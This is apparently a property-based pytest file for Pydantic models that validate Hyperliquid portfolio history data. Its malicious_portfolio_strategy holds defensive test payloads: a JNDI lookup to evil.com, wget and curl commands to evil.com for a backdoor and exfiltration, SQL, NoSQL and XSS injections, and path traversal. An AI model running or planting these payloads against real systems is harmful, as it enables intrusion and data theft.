"""Property-based tests for Hyperliquid raw portfolio models.

These tests validate critical security boundary models that process external portfolio data.
The models tested here are essential for portfolio tracking, account value history, and PnL monitoring.

SECURITY CRITICAL: These raw models protect against:
- Malicious portfolio data that could manipulate financial tracking
- Financial precision errors in account value and PnL data
- Buffer overflow attacks through oversized portfolio structures
- Injection attacks through malformed portfolio data
- Timestamp manipulation that could affect historical data
- VLM (Volume) manipulation that could affect trading metrics

Property testing ensures comprehensive coverage of portfolio edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import given, strategies as st, assume
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.hyperliquid.models.hl_raw_portfolio import (
    HyperliquidRawPortfolioHistoryEntry,
    HyperliquidRawPortfolioResponse,
    HyperliquidRawPortfolioTimeframeData,
    HyperliquidRawPortfolioTupleItem,
)
from cyberdelta.apis.exceptions.parsing import (
    DictStructureError,
    SequenceLengthError,
    StructureTypeError,
)


# =============================================================================
# HYPOTHESIS STRATEGIES FOR PORTFOLIO MODEL TESTING
# =============================================================================


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate valid timestamp values in milliseconds."""
    return st.integers(min_value=1640995200000, max_value=2147483647000)  # Valid MS timestamp range


def financial_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for financial values (account value, PnL)."""
    return st.one_of([
        # Common financial values
        st.decimals(min_value=Decimal("-1000000"), max_value=Decimal("1000000"), places=8).map(str),
        st.decimals(min_value=Decimal("-100000"), max_value=Decimal("100000"), places=6).map(str),
        # Common values
        st.just("0"),  # Zero value
        st.just("0.0"),  # Zero with decimal
        st.just("100.0"),  # Standard value
        st.just("-50.0"),  # Negative value (PnL)
        st.just("1000000.123456"),  # Large account value
        st.just("-10000.987654"),  # Large loss
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("-1.5e3"),
        st.just("2.5e-4"),
    ])


def vlm_decimal_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for VLM (Volume) values (non-negative)."""
    return st.one_of([
        # Volume values
        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000000"), places=8).map(str),
        st.decimals(min_value=Decimal("0"), max_value=Decimal("100000000"), places=6).map(str),
        # Common values
        st.just("0"),  # Zero volume
        st.just("0.0"),  # Zero with decimal
        st.just("12345.67"),  # Standard volume
        st.just("1000000.123456"),  # Large volume
        st.just("0.00000001"),  # Minimum precision
        # Scientific notation
        st.just("1e6"),
        st.just("1.5e3"),
        st.just("2.5e-4"),
    ])


def timeframe_strategy() -> SearchStrategy[str]:
    """Generate valid timeframe strings."""
    return st.sampled_from([
        "day",
        "week",
        "month",
        "year",
        "1d",
        "7d",
        "30d",
        "365d",
    ])


@st.composite
def valid_history_entry_list_data(draw) -> list[Any]:
    """Generate valid history entry as list [timestamp, value]."""
    return [
        draw(timestamp_strategy()),
        draw(financial_decimal_strategy()),
    ]


@st.composite
def valid_history_entry_dict_data(draw) -> dict[int, Any]:
    """Generate valid history entry as dict {0: timestamp, 1: value}."""
    return {
        0: draw(timestamp_strategy()),
        1: draw(financial_decimal_strategy()),
    }


@st.composite
def valid_timeframe_data(draw) -> dict[str, Any]:
    """Generate valid timeframe data."""
    return {
        "accountValueHistory": draw(
            st.lists(valid_history_entry_list_data(), min_size=0, max_size=10)
        ),
        "pnlHistory": draw(st.lists(valid_history_entry_list_data(), min_size=0, max_size=10)),
        "vlm": draw(vlm_decimal_strategy()),
    }


@st.composite
def valid_portfolio_tuple_item_data(draw) -> list[Any]:
    """Generate valid portfolio tuple item as [timeframe, timeframe_data]."""
    return [
        draw(timeframe_strategy()),
        draw(valid_timeframe_data()),
    ]


@st.composite
def valid_portfolio_response_data(draw) -> list[list[Any]]:
    """Generate valid portfolio response as list of tuple items."""
    return draw(st.lists(valid_portfolio_tuple_item_data(), min_size=0, max_size=5))


def malicious_portfolio_strategy() -> SearchStrategy[Any]:
    """Generate malicious values for portfolio security testing."""
    return st.one_of([
        # Portfolio manipulation attempts
        st.just("${jndi:ldap://evil.com/steal-portfolio}"),
        st.just("999999999999999999999999999999.99"),  # Overflow attempt
        st.just("../../etc/passwd"),  # Path traversal
        # XSS attempts
        st.just("<script>alert('portfolio-xss')</script>"),
        st.just("<img src=x onerror=alert(document.cookie)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE portfolio;--"),
        st.just("1' UNION SELECT * FROM accounts--"),
        # Buffer overflow attempts
        st.text(min_size=10000, max_size=50000),
        st.just("P" * 10000),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%n"),
        st.just("%x%x%x%x"),
        # Command injection
        st.just("; wget evil.com/backdoor"),
        st.just("`curl evil.com/exfiltrate`"),
        # NoSQL injection
        st.just("'; return db.portfolio.find(); //"),
        # JSON injection
        st.just('{"$where": "this.value > 1000000"}'),
        # Portfolio manipulation
        st.just("1000.0'; UPDATE portfolio SET value=0;--"),
        # Type confusion
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW PORTFOLIO HISTORY ENTRY MODEL
# =============================================================================


class TestHyperliquidRawPortfolioHistoryEntryProperties:
    """Property-based tests for HyperliquidRawPortfolioHistoryEntry validation and security."""

    @given(history_data=valid_history_entry_list_data())
    def test_history_entry_list_validation_success_properties(
        self, history_data: list[Any]
    ) -> None:
        """Property: Valid history entry list data should always create valid HyperliquidRawPortfolioHistoryEntry objects."""
        # Skip invalid data
        try:
            timestamp = history_data[0]
            value = history_data[1]
            assume(isinstance(timestamp, int) and timestamp > 0)
            assume(isinstance(value, str) and value.strip())
            decimal_val = Decimal(value)
            assume(decimal_val.is_finite())
        except (ValueError, TypeError, IndexError):
            assume(False)

        obj = HyperliquidRawPortfolioHistoryEntry.model_validate(history_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawPortfolioHistoryEntry)

        # Property: Fields should be preserved with correct types
        assert obj.root[0] == history_data[0]
        # Note: Business logic might normalize values like "0.0" to "0"
        assert isinstance(obj.root[1], str)

    @given(history_data=valid_history_entry_dict_data())
    def test_history_entry_dict_validation_success_properties(
        self, history_data: dict[int, Any]
    ) -> None:
        """Property: Valid history entry dict data should always create valid HyperliquidRawPortfolioHistoryEntry objects."""
        # Skip invalid data
        try:
            timestamp = history_data[0]
            value = history_data[1]
            assume(isinstance(timestamp, int) and timestamp > 0)
            assume(isinstance(value, str) and value.strip())
            decimal_val = Decimal(value)
            assume(decimal_val.is_finite())
        except (ValueError, TypeError, KeyError):
            assume(False)

        obj = HyperliquidRawPortfolioHistoryEntry.model_validate(history_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawPortfolioHistoryEntry)

        # Property: Fields should be preserved with correct types
        assert obj.root[0] == history_data[0]
        assert isinstance(obj.root[1], str)

    @given(field_index=st.sampled_from([0, 1]), malicious_value=malicious_portfolio_strategy())
    def test_history_entry_security_boundary_properties(
        self, field_index: int, malicious_value: Any
    ) -> None:
        """Property: History entry model should reject malicious inputs safely."""
        base_data = [1741886630493, "100.0"]
        base_data[field_index] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, StructureTypeError, SequenceLengthError)):
            HyperliquidRawPortfolioHistoryEntry.model_validate(base_data)

    @given(
        timestamp=timestamp_strategy(),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("100.50"),
            st.just("-50.25"),
            st.just("1e6"),
            st.just("-2.5e-4"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ]),
    )
    def test_history_entry_decimal_validation_properties(
        self, timestamp: int, decimal_value: str
    ) -> None:
        """Property: History entry decimal field should validate properly."""
        history_data = [timestamp, decimal_value]

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = HyperliquidRawPortfolioHistoryEntry.model_validate(history_data)
                assert obj.root[0] == timestamp
                assert isinstance(obj.root[1], str)
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises(ValidationError):
                    HyperliquidRawPortfolioHistoryEntry.model_validate(history_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawPortfolioHistoryEntry.model_validate(history_data)

    @given(
        invalid_structure=st.one_of([
            st.just([]),  # Empty list
            st.just([123]),  # Single element
            st.just([123, "1.0", "extra"]),  # Too many elements
            st.just("not_a_list"),  # Not a list
            st.integers(),  # Wrong type
            st.dictionaries(st.text(), st.text()),  # Wrong dict structure
        ])
    )
    def test_history_entry_structure_validation_properties(self, invalid_structure: Any) -> None:
        """Property: History entry should reject invalid structures."""
        # Property: Invalid structures should be rejected
        with pytest.raises((
            ValidationError,
            StructureTypeError,
            SequenceLengthError,
            DictStructureError,
        )):
            HyperliquidRawPortfolioHistoryEntry.model_validate(invalid_structure)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW PORTFOLIO TIMEFRAME DATA MODEL
# =============================================================================


class TestHyperliquidRawPortfolioTimeframeDataProperties:
    """Property-based tests for HyperliquidRawPortfolioTimeframeData validation and security."""

    @given(timeframe_data=valid_timeframe_data())
    def test_timeframe_data_validation_success_properties(
        self, timeframe_data: dict[str, Any]
    ) -> None:
        """Property: Valid timeframe data should always create valid HyperliquidRawPortfolioTimeframeData objects."""
        # Skip invalid data
        try:
            # Validate VLM field
            vlm_val = Decimal(timeframe_data["vlm"])
            assume(vlm_val.is_finite() and vlm_val >= 0)

            # Validate history entries
            for history_list in [
                timeframe_data["accountValueHistory"],
                timeframe_data["pnlHistory"],
            ]:
                for entry in history_list:
                    assume(len(entry) == 2)
                    assume(isinstance(entry[0], int) and entry[0] > 0)
                    assume(isinstance(entry[1], str) and entry[1].strip())
                    decimal_val = Decimal(entry[1])
                    assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        obj = HyperliquidRawPortfolioTimeframeData.model_validate(timeframe_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawPortfolioTimeframeData)

        # Property: All fields should be preserved with correct types
        assert len(obj.account_value_history) == len(timeframe_data["accountValueHistory"])
        assert len(obj.pnl_history) == len(timeframe_data["pnlHistory"])
        assert obj.vlm == timeframe_data["vlm"]

    @given(
        field_name=st.sampled_from(["accountValueHistory", "pnlHistory", "vlm"]),
        malicious_value=malicious_portfolio_strategy(),
    )
    def test_timeframe_data_security_boundary_properties(
        self, field_name: str, malicious_value: Any
    ) -> None:
        """Property: Timeframe data model should reject malicious inputs safely."""
        base_data = {
            "accountValueHistory": [[1741886630493, "100.0"]],
            "pnlHistory": [[1741886630493, "-50.0"]],
            "vlm": "12345.67",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawPortfolioTimeframeData.model_validate(base_data)

    @given(
        vlm_value=st.one_of([
            # Valid VLM values
            st.just("0"),
            st.just("12345.67"),
            st.just("1e6"),
            st.just("2.5e-4"),
            # Invalid VLM values
            st.just("-100.0"),  # Negative (not allowed for VLM)
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("Infinity"),
            st.just("-Infinity"),
            st.just("1..0"),
            st.just("not_a_number"),
            st.just(""),
            st.just("   "),
        ])
    )
    def test_timeframe_data_vlm_validation_properties(self, vlm_value: str) -> None:
        """Property: Timeframe data VLM field should validate properly."""
        timeframe_data = {
            "accountValueHistory": [[1741886630493, "100.0"]],
            "pnlHistory": [[1741886630493, "-50.0"]],
            "vlm": vlm_value,
        }

        try:
            # Check if the value can be parsed as a finite non-negative decimal
            decimal_val = Decimal(vlm_value.strip() if vlm_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not vlm_value.strip()
            is_non_negative = decimal_val >= 0

            if is_finite and not is_empty and is_non_negative:
                # Property: Valid finite non-negative decimals should be accepted
                obj = HyperliquidRawPortfolioTimeframeData.model_validate(timeframe_data)
                assert obj.vlm == vlm_value
            else:
                # Property: Non-finite, empty, or negative values should be rejected
                with pytest.raises(ValidationError):
                    HyperliquidRawPortfolioTimeframeData.model_validate(timeframe_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                HyperliquidRawPortfolioTimeframeData.model_validate(timeframe_data)

    @given(timeframe_data=valid_timeframe_data())
    def test_timeframe_data_extra_fields_properties(self, timeframe_data: dict[str, Any]) -> None:
        """Property: Timeframe data model should forbid extra fields."""
        # Skip invalid data
        try:
            vlm_val = Decimal(timeframe_data["vlm"])
            assume(vlm_val.is_finite() and vlm_val >= 0)
        except (ValueError, TypeError):
            assume(False)

        # Add extra fields
        timeframe_data_with_extra = timeframe_data.copy()
        timeframe_data_with_extra["extra"] = "forbidden"
        timeframe_data_with_extra["malicious"] = {"nested": "data"}

        # Property: Extra fields should be rejected
        with pytest.raises(ValidationError):
            HyperliquidRawPortfolioTimeframeData.model_validate(timeframe_data_with_extra)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW PORTFOLIO TUPLE ITEM MODEL
# =============================================================================


class TestHyperliquidRawPortfolioTupleItemProperties:
    """Property-based tests for HyperliquidRawPortfolioTupleItem validation and security."""

    @given(tuple_item_data=valid_portfolio_tuple_item_data())
    def test_portfolio_tuple_item_validation_success_properties(
        self, tuple_item_data: list[Any]
    ) -> None:
        """Property: Valid portfolio tuple item data should always create valid HyperliquidRawPortfolioTupleItem objects."""
        # Skip invalid data
        try:
            timeframe = tuple_item_data[0]
            timeframe_data = tuple_item_data[1]
            assume(isinstance(timeframe, str) and timeframe.strip())
            assume(isinstance(timeframe_data, dict))

            # Validate VLM field
            vlm_val = Decimal(timeframe_data["vlm"])
            assume(vlm_val.is_finite() and vlm_val >= 0)

            # Validate history entries
            for history_list in [
                timeframe_data["accountValueHistory"],
                timeframe_data["pnlHistory"],
            ]:
                for entry in history_list:
                    assume(len(entry) == 2)
                    assume(isinstance(entry[0], int) and entry[0] > 0)
                    assume(isinstance(entry[1], str) and entry[1].strip())
                    decimal_val = Decimal(entry[1])
                    assume(decimal_val.is_finite())
        except (ValueError, TypeError, IndexError, KeyError):
            assume(False)

        obj = HyperliquidRawPortfolioTupleItem.model_validate(tuple_item_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawPortfolioTupleItem)

        # Property: Fields should be preserved with correct types
        assert obj.root[0] == tuple_item_data[0]
        assert isinstance(obj.root[1], HyperliquidRawPortfolioTimeframeData)

    @given(field_index=st.sampled_from([0, 1]), malicious_value=malicious_portfolio_strategy())
    def test_portfolio_tuple_item_security_boundary_properties(
        self, field_index: int, malicious_value: Any
    ) -> None:
        """Property: Portfolio tuple item model should reject malicious inputs safely."""
        base_data = [
            "day",
            {
                "accountValueHistory": [[1741886630493, "100.0"]],
                "pnlHistory": [[1741886630493, "-50.0"]],
                "vlm": "12345.67",
            },
        ]
        base_data[field_index] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, StructureTypeError, SequenceLengthError)):
            HyperliquidRawPortfolioTupleItem.model_validate(base_data)

    @given(
        invalid_structure=st.one_of([
            st.just([]),  # Empty list
            st.just(["day"]),  # Single element
            st.just(["day", {}, "extra"]),  # Too many elements
            st.just("not_a_list"),  # Not a list
            st.integers(),  # Wrong type
            st.just(["day", "not_a_dict"]),  # Second element not dict
        ])
    )
    def test_portfolio_tuple_item_structure_validation_properties(
        self, invalid_structure: Any
    ) -> None:
        """Property: Portfolio tuple item should reject invalid structures."""
        # Property: Invalid structures should be rejected
        with pytest.raises((ValidationError, StructureTypeError, SequenceLengthError)):
            HyperliquidRawPortfolioTupleItem.model_validate(invalid_structure)


# =============================================================================
# PROPERTY TESTS FOR HYPERLIQUID RAW PORTFOLIO RESPONSE MODEL
# =============================================================================


class TestHyperliquidRawPortfolioResponseProperties:
    """Property-based tests for HyperliquidRawPortfolioResponse validation and security."""

    @given(portfolio_data=valid_portfolio_response_data())
    def test_portfolio_response_validation_success_properties(
        self, portfolio_data: list[list[Any]]
    ) -> None:
        """Property: Valid portfolio response data should always create valid HyperliquidRawPortfolioResponse objects."""
        # Skip invalid data
        try:
            for tuple_item in portfolio_data:
                assume(len(tuple_item) == 2)
                timeframe = tuple_item[0]
                timeframe_data = tuple_item[1]
                assume(isinstance(timeframe, str) and timeframe.strip())
                assume(isinstance(timeframe_data, dict))

                # Validate VLM field
                vlm_val = Decimal(timeframe_data["vlm"])
                assume(vlm_val.is_finite() and vlm_val >= 0)

                # Validate history entries
                for history_list in [
                    timeframe_data["accountValueHistory"],
                    timeframe_data["pnlHistory"],
                ]:
                    for entry in history_list:
                        assume(len(entry) == 2)
                        assume(isinstance(entry[0], int) and entry[0] > 0)
                        assume(isinstance(entry[1], str) and entry[1].strip())
                        decimal_val = Decimal(entry[1])
                        assume(decimal_val.is_finite())
        except (ValueError, TypeError, IndexError, KeyError):
            assume(False)

        obj = HyperliquidRawPortfolioResponse.model_validate(portfolio_data)

        # Property: Object should be created successfully
        assert isinstance(obj, HyperliquidRawPortfolioResponse)

        # Property: Root should be preserved with correct length
        assert len(obj.root) == len(portfolio_data)

    @given(malicious_value=malicious_portfolio_strategy())
    def test_portfolio_response_security_boundary_properties(self, malicious_value: Any) -> None:
        """Property: Portfolio response model should reject malicious inputs safely."""
        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, StructureTypeError)):
            HyperliquidRawPortfolioResponse.model_validate(malicious_value)

    @given(
        invalid_structure=st.one_of([
            st.just("not_a_list"),  # Not a list
            st.integers(),  # Wrong type
            st.dictionaries(st.text(), st.text()),  # Wrong type
            st.binary(),  # Binary data
        ])
    )
    def test_portfolio_response_structure_validation_properties(
        self, invalid_structure: Any
    ) -> None:
        """Property: Portfolio response should reject invalid structures."""
        # Property: Invalid structures should be rejected
        with pytest.raises((ValidationError, StructureTypeError)):
            HyperliquidRawPortfolioResponse.model_validate(invalid_structure)

    def test_portfolio_response_empty_list_properties(self) -> None:
        """Property: Portfolio response should accept empty list."""
        # Property: Empty list should be accepted
        obj = HyperliquidRawPortfolioResponse.model_validate([])
        assert obj.root == []


# =============================================================================
# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
# =============================================================================


class TestHyperliquidRawPortfolioIntegrationProperties:
    """Integration property tests for portfolio models working together."""

    @given(
        portfolio_data=valid_portfolio_response_data(),
        malicious_history_entry=malicious_portfolio_strategy(),
    )
    def test_portfolio_models_integration_properties(
        self, portfolio_data: list[list[Any]], malicious_history_entry: Any
    ) -> None:
        """Property: Portfolio models should work consistently together."""
        # Skip invalid data
        try:
            for tuple_item in portfolio_data:
                assume(len(tuple_item) == 2)
                timeframe_data = tuple_item[1]
                assume(isinstance(timeframe_data, dict))
                vlm_val = Decimal(timeframe_data["vlm"])
                assume(vlm_val.is_finite() and vlm_val >= 0)
        except (ValueError, TypeError, IndexError, KeyError):
            assume(False)

        # Property: Valid data should create valid objects
        if portfolio_data:  # Only test if not empty
            response_obj = HyperliquidRawPortfolioResponse.model_validate(portfolio_data)
            assert isinstance(response_obj, HyperliquidRawPortfolioResponse)

            # Test first tuple item
            first_tuple_item = response_obj.root[0]
            assert isinstance(first_tuple_item, HyperliquidRawPortfolioTupleItem)
            assert isinstance(first_tuple_item.root[1], HyperliquidRawPortfolioTimeframeData)

        # Property: Malicious history entry should be rejected when injected
        if portfolio_data:
            corrupted_data = portfolio_data.copy()
            if corrupted_data[0][1]["accountValueHistory"]:
                corrupted_data[0][1]["accountValueHistory"][0] = malicious_history_entry

                with pytest.raises((
                    ValidationError,
                    TypeError,
                    StructureTypeError,
                    SequenceLengthError,
                    DictStructureError,
                )):
                    HyperliquidRawPortfolioResponse.model_validate(corrupted_data)

    @given(
        complete_malicious_data=st.dictionaries(
            st.sampled_from(["accountValueHistory", "pnlHistory", "vlm"]),
            malicious_portfolio_strategy(),
            min_size=2,
            max_size=3,
        )
    )
    def test_portfolio_models_adversarial_input_properties(
        self, complete_malicious_data: dict[str, Any]
    ) -> None:
        """Property: All portfolio models should safely handle complete adversarial input."""
        # Property: Complete adversarial input should be safely rejected by timeframe data model
        with pytest.raises((ValidationError, TypeError)):
            HyperliquidRawPortfolioTimeframeData.model_validate(complete_malicious_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_HyperliquidRawPortfolioHistoryEntry_real_world_example() -> None:
    """Test with real-world portfolio history entry data."""
    payload_list = [1741886630493, "1000.50"]
    obj = HyperliquidRawPortfolioHistoryEntry.model_validate(payload_list)
    assert obj.root[0] == 1741886630493
    assert obj.root[1] == "1000.50"


def test_HyperliquidRawPortfolioHistoryEntry_dict_example() -> None:
    """Test with dict format portfolio history entry data."""
    payload_dict = {0: 1741886630493, 1: "-250.75"}
    obj = HyperliquidRawPortfolioHistoryEntry.model_validate(payload_dict)
    assert obj.root[0] == 1741886630493
    assert obj.root[1] == "-250.75"


def test_HyperliquidRawPortfolioTimeframeData_real_world_example() -> None:
    """Test with real-world timeframe data."""
    payload = {
        "accountValueHistory": [
            [1741886630493, "1000.0"],
            [1741895270493, "1050.5"],
        ],
        "pnlHistory": [
            [1741886630493, "0.0"],
            [1741895270493, "50.5"],
        ],
        "vlm": "12345.67",
    }
    obj = HyperliquidRawPortfolioTimeframeData.model_validate(payload)
    assert len(obj.account_value_history) == 2
    assert len(obj.pnl_history) == 2
    assert obj.vlm == "12345.67"


def test_HyperliquidRawPortfolioTupleItem_real_world_example() -> None:
    """Test with real-world portfolio tuple item data."""
    payload = [
        "day",
        {
            "accountValueHistory": [[1741886630493, "1000.0"]],
            "pnlHistory": [[1741886630493, "50.0"]],
            "vlm": "12345.67",
        },
    ]
    obj = HyperliquidRawPortfolioTupleItem.model_validate(payload)
    assert obj.root[0] == "day"
    assert obj.root[1].vlm == "12345.67"


def test_HyperliquidRawPortfolioResponse_real_world_example() -> None:
    """Test with real-world portfolio response data."""
    payload = [
        [
            "day",
            {
                "accountValueHistory": [[1741886630493, "1000.0"]],
                "pnlHistory": [[1741886630493, "50.0"]],
                "vlm": "12345.67",
            },
        ],
        [
            "week",
            {
                "accountValueHistory": [[1741886630493, "950.0"]],
                "pnlHistory": [[1741886630493, "-50.0"]],
                "vlm": "98765.43",
            },
        ],
    ]
    obj = HyperliquidRawPortfolioResponse.model_validate(payload)
    assert len(obj.root) == 2
    assert obj.root[0].root[0] == "day"
    assert obj.root[1].root[0] == "week"


def test_HyperliquidRawPortfolioResponse_empty_list_example() -> None:
    """Test with empty portfolio response."""
    payload = []
    obj = HyperliquidRawPortfolioResponse.model_validate(payload)
    assert obj.root == []


def test_HyperliquidRawPortfolioHistoryEntry_zero_values_example() -> None:
    """Test with zero values."""
    payload = [1741886630493, "0"]
    obj = HyperliquidRawPortfolioHistoryEntry.model_validate(payload)
    assert obj.root[0] == 1741886630493
    assert obj.root[1] == "0"


def test_HyperliquidRawPortfolioHistoryEntry_negative_pnl_example() -> None:
    """Test with negative PnL value."""
    payload = [1741886630493, "-1500.75"]
    obj = HyperliquidRawPortfolioHistoryEntry.model_validate(payload)
    assert obj.root[0] == 1741886630493
    assert obj.root[1] == "-1500.75"


def test_HyperliquidRawPortfolioTimeframeData_scientific_notation_example() -> None:
    """Test with scientific notation values."""
    payload = {
        "accountValueHistory": [[1741886630493, "1e6"]],
        "pnlHistory": [[1741886630493, "-2.5e3"]],
        "vlm": "1.23456e4",
    }
    obj = HyperliquidRawPortfolioTimeframeData.model_validate(payload)
    assert obj.account_value_history[0].root[1] == "1e6"
    assert obj.pnl_history[0].root[1] == "-2.5e3"
    assert obj.vlm == "1.23456e4"


def test_HyperliquidRawPortfolioTimeframeData_empty_history_example() -> None:
    """Test with empty history lists."""
    payload = {
        "accountValueHistory": [],
        "pnlHistory": [],
        "vlm": "0",
    }
    obj = HyperliquidRawPortfolioTimeframeData.model_validate(payload)
    assert len(obj.account_value_history) == 0
    assert len(obj.pnl_history) == 0
    assert obj.vlm == "0"
